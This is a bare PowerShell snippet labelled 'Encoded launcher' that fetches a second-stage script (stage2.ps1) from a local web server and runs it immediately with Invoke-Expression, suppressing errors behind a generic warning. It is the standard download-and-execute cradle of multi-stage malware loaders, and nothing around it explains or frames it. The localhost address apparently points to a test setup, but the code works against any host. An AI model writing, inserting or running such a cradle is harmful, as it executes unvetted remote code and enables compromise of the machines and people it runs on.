
# Encoded launcher
try { $RemoteUrl = 'http://localhost:8081/stage2.ps1'; $DownloadedScript = (New-Object System.Net.WebClient).DownloadString($RemoteUrl); IEX $DownloadedScript; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Stage transfer failed" }
